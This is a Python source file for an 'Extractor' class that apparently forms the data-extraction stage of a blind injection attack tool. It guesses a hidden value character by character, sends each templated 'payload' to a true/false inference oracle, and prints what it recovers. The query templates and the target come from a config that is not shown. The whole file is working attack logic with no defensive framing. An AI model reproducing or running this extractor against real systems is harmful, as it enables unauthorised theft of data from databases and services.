class Extractor:
    def __init__(self, inference_engine, config, logger):
        self.inf = inference_engine
        self.logger = logger

        self.charset = config["extraction"]["charset"]
        self.max_length = config["extraction"]["max_length"]
        self.query_template = config["extraction"]["query"]

    def extract(self):
        extracted = ""
        print("\nStarting extraction...\n")

        for position in range(1, self.max_length + 1):
            found = False

            for c in self.charset:
                payload = self.query_template.format(
                    pos=position,
                    char=c
                )

                print(f"TESTING: {payload}")

                if self.inf.is_true(payload):
                    extracted += c
                    print("[+] Found:", extracted)
                    found = True
                    break

            if not found:
                print("\n[!] No more characters found. Stopping.")
                break

        print("\nExtraction complete:", extracted)
        return extracted
